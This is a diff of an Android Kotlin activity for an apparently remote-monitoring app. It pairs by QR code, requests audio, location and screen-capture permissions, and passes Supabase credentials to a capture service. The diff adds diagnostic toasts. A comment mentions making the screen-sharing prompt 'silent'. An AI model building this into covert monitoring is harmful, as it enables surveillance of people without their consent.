@@ -6,6 +6,8 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
 import android.os.Bundle
+import android.util.Log
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 
@@ -14,25 +16,42 @@ import androidx.core.app.ActivityCompat
  * Depois de pareado, pede o compartilhamento de tela (diálogo padrão do
  * Android — ver README sobre o que falta para isso ser silencioso) e sobe
  * o ScreenCaptureService com a config lida do QR.
+ *
+ * Os Toasts abaixo são só pra diagnóstico — ajudam a ver em que etapa o
+ * fluxo parou, sem precisar de computador/adb conectado. Pode remover
+ * depois que confirmar que está tudo funcionando.
  */
 class MainActivity : AppCompatActivity() {
 
+    private val TAG = "FreedomRemoteAccess"
     private val REQUEST_CODE_CAPTURE = 42
     private val REQUEST_CODE_PAIR = 43
     private val REQUEST_CODE_LOCATION = 44
     private val REQUEST_CODE_AUDIO = 45
 
+    private fun aviso(msg: String) {
+        Log.d(TAG, msg)
+        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        if (!DeviceConfig.isPaired(this)) {
-            startActivityForResult(Intent(this, QRScanActivity::class.java), REQUEST_CODE_PAIR)
-            return
-        }
+        try {
+            if (!DeviceConfig.isPaired(this)) {
+                aviso("Abrindo leitor de QR...")
+                startActivityForResult(Intent(this, QRScanActivity::class.java), REQUEST_CODE_PAIR)
+                return
+            }
 
-        ensureAudioPermission()
-        ensureLocationPermissionAndSchedule()
-        requestScreenCapture()
+            aviso("Já pareado (deviceId=${DeviceConfig.deviceId(this)}). Pedindo permissões...")
+            ensureAudioPermission()
+            ensureLocationPermissionAndSchedule()
+            requestScreenCapture()
+        } catch (e: Exception) {
+            aviso("ERRO no onCreate: ${e.message}")
+            Log.e(TAG, "Erro no onCreate", e)
+        }
     }
 
     private fun ensureAudioPermission() {
@@ -70,40 +89,66 @@ class MainActivity : AppCompatActivity() {
                 REQUEST_CODE_LOCATION
             )
         }
-        startForegroundService(Intent(this, LocationTrackingService::class.java))
+        try {
+            startForegroundService(Intent(this, LocationTrackingService::class.java))
+        } catch (e: Exception) {
+            aviso("ERRO ao iniciar serviço de localização: ${e.message}")
+            Log.e(TAG, "Erro ao iniciar LocationTrackingService", e)
+        }
     }
 
     private fun requestScreenCapture() {
-        val projectionManager =
-            getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        startActivityForResult(
-            projectionManager.createScreenCaptureIntent(),
-            REQUEST_CODE_CAPTURE
-        )
+        try {
+            val projectionManager =
+                getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            aviso("Abrindo a tela de permissão de compartilhamento de tela...")
+            startActivityForResult(
+                projectionManager.createScreenCaptureIntent(),
+                REQUEST_CODE_CAPTURE
+            )
+        } catch (e: Exception) {
+            aviso("ERRO ao pedir captura de tela: ${e.message}")
+            Log.e(TAG, "Erro em requestScreenCapture", e)
+        }
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
 
-        if (requestCode == REQUEST_CODE_PAIR) {
-            if (DeviceConfig.isPaired(this)) {
-                requestScreenCapture()
-            } else {
-                finish() // usuário saiu sem parear
+        try {
+            if (requestCode == REQUEST_CODE_PAIR) {
+                if (DeviceConfig.isPaired(this)) {
+                    aviso("Pareado com sucesso (deviceId=${DeviceConfig.deviceId(this)}). Pedindo permissões...")
+                    ensureAudioPermission()
+                    ensureLocationPermissionAndSchedule()
+                    requestScreenCapture()
+                } else {
+                    aviso("Pareamento não concluído — câmera fechou sem ler um QR válido.")
+                    finish()
+                }
+                return
             }
-            return
-        }
 
-        if (requestCode == REQUEST_CODE_CAPTURE && resultCode == Activity.RESULT_OK && data != null) {
-            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
-                putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
-                putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
-                putExtra(ScreenCaptureService.EXTRA_DEVICE_ID, DeviceConfig.deviceId(this@MainActivity))
-                putExtra(ScreenCaptureService.EXTRA_SUPABASE_URL, DeviceConfig.supabaseUrl(this@MainActivity))
-                putExtra(ScreenCaptureService.EXTRA_SUPABASE_KEY, DeviceConfig.supabaseKey(this@MainActivity))
+            if (requestCode == REQUEST_CODE_CAPTURE) {
+                if (resultCode == Activity.RESULT_OK && data != null) {
+                    aviso("Permissão de tela concedida. Iniciando o serviço...")
+                    val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                        putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
+                        putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
+                        putExtra(ScreenCaptureService.EXTRA_DEVICE_ID, DeviceConfig.deviceId(this@MainActivity))
+                        putExtra(ScreenCaptureService.EXTRA_SUPABASE_URL, DeviceConfig.supabaseUrl(this@MainActivity))
+                        putExtra(ScreenCaptureService.EXTRA_SUPABASE_KEY, DeviceConfig.supabaseKey(this@MainActivity))
+                    }
+                    startForegroundService(serviceIntent)
+                } else {
+                    aviso("Permissão de tela NEGADA pelo usuário (resultCode=$resultCode).")
+                }
             }
-            startForegroundService(serviceIntent)
+            finish()
+        } catch (e: Exception) {
+            aviso("ERRO no onActivityResult: ${e.message}")
+            Log.e(TAG, "Erro no onActivityResult", e)
+            finish()
         }
-        finish()
     }
 }
